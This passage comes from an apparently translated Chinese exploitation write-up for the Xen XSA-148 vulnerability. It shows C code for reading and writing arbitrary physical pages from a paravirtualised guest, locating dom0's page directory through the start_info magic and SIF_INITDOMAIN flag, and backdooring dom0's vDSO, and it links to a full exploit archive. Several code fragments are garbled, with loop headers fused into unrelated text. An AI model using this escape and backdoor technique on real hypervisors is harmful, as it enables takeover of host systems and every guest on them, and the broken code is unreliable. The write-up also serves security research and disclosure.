            {
                    memcpy(buff, l2_entry_va, PAGE_SIZE);
            }
            else if (what == DO_PAGE_WRITE)
            {
                    memcpy(l2_entry_va, buff, PAGE_SIZE);
            }
            set_l2_pse_flag((unsigned long) l2_entry_va);
            *(unsigned long*) l2_entry_va = 0;
            unset_l2_pse_flag((unsigned long) l2_entry_va);
    }
**  
**
**dom0** **中执行代码**
好了,我们能够读写任意实物理页面了,困难的是找到一些有趣的东西。dom0
的页目录是个不错的目标,这应该让我们解决任何虚拟地址到对应的物理页的映射,那时可以写入进程内存来执行一些任意代码,或是在任意进程中发现一个有趣的页面映射(如
vDSO ;))。
由于 Xen 的内存布局,很容易找到一个像页目录的页面(xen/include/asm-x86/config.h):
    /*
     * Memory layout:
     *  0x0000000000000000 - 0x00007fffffffffff [128TB, 2^47 bytes, PML4:0-255]
     *    Guest-defined use (see below for compatibility mode guests).
     *  0x0000800000000000 - 0xffff7fffffffffff [16EB]
     *    Inaccessible: current arch only supports 48-bit sign-extended VAs.
     *  0xffff800000000000 - 0xffff803fffffffff [256GB, 2^38 bytes, PML4:256]
     *    Read-only machine-to-phys translation table (GUEST ACCESSIBLE).
     *  0xffff804000000000 - 0xffff807fffffffff [256GB, 2^38 bytes, PML4:256]
     *    Reserved for future shared info with the guest OS (GUEST ACCESSIBLE).
     *  0xffff808000000000 - 0xffff80ffffffffff [512GB, 2^39 bytes, PML4:257]
     *    ioremap for PCI mmconfig space
     *  0xffff810000000000 - 0xffff817fffffffff [512GB, 2^39 bytes, PML4:258]
     *    Guest linear page table.
     *  0xffff818000000000 - 0xffff81ffffffffff [512GB, 2^39 bytes, PML4:259]
     *    Shadow linear page table.
     *  0xffff820000000000 - 0xffff827fffffffff [512GB, 2^39 bytes, PML4:260]
     *    Per-domain mappings (e.g., GDT, LDT).
     *  0xffff828000000000 - 0xffff82bfffffffff [256GB, 2^38 bytes, PML4:261]
     *    Machine-to-phys translation table.
     *  0xffff82c000000000 - 0xffff82cfffffffff [64GB,  2^36 bytes, PML4:261]
     *    vmap()/ioremap()/fixmap area.
     *  0xffff82d000000000 - 0xffff82d03fffffff [1GB,   2^30 bytes, PML4:261]
     *    Compatibility machine-to-phys translation table.
     *  0xffff82d040000000 - 0xffff82d07fffffff [1GB,   2^30 bytes, PML4:261]
     *    High read-only compatibility machine-to-phys translation table.
     *  0xffff82d080000000 - 0xffff82d0bfffffff [1GB,   2^30 bytes, PML4:261]
     *    Xen text, static data, bss.
    #ifndef CONFIG_BIGMEM
     *  0xffff82d0c0000000 - 0xffff82dffbffffff [61GB - 64MB,       PML4:261]
     *    Reserved for future use.
     *  0xffff82dffc000000 - 0xffff82dfffffffff [64MB,  2^26 bytes, PML4:261]
     *    Super-page information array.
     *  0xffff82e000000000 - 0xffff82ffffffffff [128GB, 2^37 bytes, PML4:261]
     *    Page-frame information array.
     *  0xffff830000000000 - 0xffff87ffffffffff [5TB, 5*2^40 bytes, PML4:262-271]
     *    1:1 direct mapping of all physical memory.
    #else
     *  0xffff82d0c0000000 - 0xffff82ffdfffffff [188.5GB,           PML4:261]
     *    Reserved for future use.
     *  0xffff82ffe0000000 - 0xffff82ffffffffff [512MB, 2^29 bytes, PML4:261]
     *    Super-page information array.
     *  0xffff830000000000 - 0xffff847fffffffff [1.5TB, 3*2^39 bytes, PML4:262-264]
     *    Page-frame information array.
     *  0xffff848000000000 - 0xffff87ffffffffff [3.5TB, 7*2^39 bytes, PML4:265-271]
     *    1:1 direct mapping of all physical memory.
    #endif
     *  0xffff880000000000 - 0xffffffffffffffff [120TB,             PML4:272-511]
     *    PV: Guest-defined use.
     *  0xffff880000000000 - 0xffffff7fffffffff [119.5TB,           PML4:272-510]
     *    HVM/idle: continuation of 1:1 mapping
     *  0xffffff8000000000 - 0xffffffffffffffff [512GB, 2^39 bytes  PML4:511]
     *    HVM/idle: unused
     *
     * Compatibility guest area layout:
     *  0x0000000000000000 - 0x00000000f57fffff [3928MB,            PML4:0]
     *    Guest-defined use.
     *  0x00000000f5800000 - 0x00000000ffffffff [168MB,             PML4:0]
     *    Read-only machine-to-phys translation table (GUEST ACCESSIBLE).
     *  0x0000000100000000 - 0x0000007fffffffff [508GB,             PML4:0]
     *    Unused.
     *  0x0000008000000000 - 0x000000ffffffffff [512GB, 2^39 bytes, PML4:1]
     *    Hypercall argument translation area.
     *  0x0000010000000000 - 0x00007fffffffffff [127TB, 2^46 bytes, PML4:2-255]
     *    Reserved for future use.
     */
如你接下来要看到的,每个半虚拟化客户机都有一些与 Xen 有关的表映射到其自身的虚拟内存:机器地址到物理地址转换表,Xen
代码等。这些映射对每一个客户机而言都是一样的,我们可以尝试寻找物理页,它在于客户机相同的偏移处具有相同的值。同时,由于 dom0 使用的是半虚拟化
Linux 内核,偏移 510 和 511 不应被置为0(0xFFFFFFFF……地址)。这也是我们正在做的,以找到一个潜在的页目录:
    for(page=0; page-".            */
        ...
        uint32_t flags;             /* SIF_xxx flags.                         */
        ...
    };
你可以看到,start_info 结构起始处有个魔数,包含标记字段。我们只需要解析整个页目录对应的页开始处的魔数:
    int is_startup_info_page(char *page_data)
    {
            int ret = 0;
            char marker[] = "xen-3.0-x86";
            if(memcmp(page_data, marker, sizeof(marker)-1) == 0)
            {
                    ret = 1;
            }
            return ret;
    }
可以通过检查 SIF_INITDOMAIN 标志是否设置来判断页目录是否属于 dom0。
    for(page=0; pageflags & SIF_INITDOMAIN)
                            {
                                    DEBUG("dom0!");
                            } else {
                                    DEBUG("not dom0");
                            }
                    }
            }
    }
这样,我们可以如同 scumjr 的 SMM后门[5]一样,在 dom0 的 vDSO 中设置后门了。在他的博文中说,vDSO 库由 Linux
内核映射到每个用户进程,很容易发现它。因此,我们只需要解析一次页目录,搜索 vDSO 并给它植入一个后门。
    if(start_f->flags & SIF_INITDOMAIN)
    {
            DEBUG("dom0!");
            dump_page_buff(page, buff);
            tmp = find_vdso_into_L4(page, (pgd_t*) buff);
            if(tmp != 0)
            {
                    DEBUG("dom0 vdso : 0x%x", tmp);
                    patch_vdso(tmp);
                    DEBUG("patch.");
                    break;
            }
    }
演示:[https://asciinema.org/a/cwm26vzbjqx0d3eseic51igho](https://asciinema.org/a/cwm26vzbjqx0d3eseic51igho)
完整利用:[http://blog.quarkslab.com/resources/2016-07-12_xsa-148/code/xsa148_exploit.tar.gz](http://blog.quarkslab.com/resources/2016-07-12_xsa-148/code/xsa148_exploit.tar.gz)
**  
**
**结论**
这个可能是 Xen 有史以来最严重的漏洞,它在被发现前已经存在了7年。如本文所述,利用它来实现 dom0 内代码执行并不难。可以做比修补 vDSO
更多的事,如栾尚聪选择的是超级调用页。
原来这第二部分应该是最后一篇……但我们最近发现了一个新的漏洞可以让客户机逃逸。相关公告已经在昨天公开披露(XSA-182[9],CVE-2016-6258[10]),下篇我们将介绍如何编写一个完整的利用。敬请关注!
[1] (1, 2)
[http://xenbits.xen.org/xsa/advisory-148.html](http://xenbits.xen.org/xsa/advisory-148.html)
[2]
[http://download.intel.com/design/processor/manuals/253668.pdf](http://download.intel.com/design/processor/manuals/253668.pdf)
[3]
[http://wiki.xen.org/wiki/X86_Paravirtualised_Memory_Management](http://wiki.xen.org/wiki/X86_Paravirtualised_Memory_Management)
[4] [https://github.com/QubesOS/qubes-secpack/blob/master/QSBs/qsb-022-2015.txt](https://github.com/QubesOS/qubes-secpack/blob/master/QSBs/qsb-022-2015.txt)
[5] [https://scumjr.github.io/2016/01/10/from-smm-to-userland-in-a-few-bytes/](https://scumjr.github.io/2016/01/10/from-smm-to-userland-in-a-few-bytes/)
[6] (1, 2) [https://conference.hitb.org/hitbsecconf2016ams/sessions/advanced-exploitation-xen-hypervisor-vm-escape/](https://conference.hitb.org/hitbsecconf2016ams/sessions/advanced-exploitation-xen-hypervisor-vm-escape/)
[7] [https://www.blackhat.com/us-16/briefings.html#ouroboros-tearing-xen-hypervisor-with-the-snake](https://www.blackhat.com/us-16/briefings.html#ouroboros-tearing-xen-hypervisor-with-the-snake)
[8] [http://blog.quarkslab.com/xen-exploitation-part-1-xsa-105-from-nobody-to-root.html](http://blog.quarkslab.com/xen-exploitation-part-1-xsa-105-from-nobody-to-root.html)
[9]
[http://xenbits.xen.org/xsa/advisory-182.html](http://xenbits.xen.org/xsa/advisory-182.html)
[10] [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6258](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6258)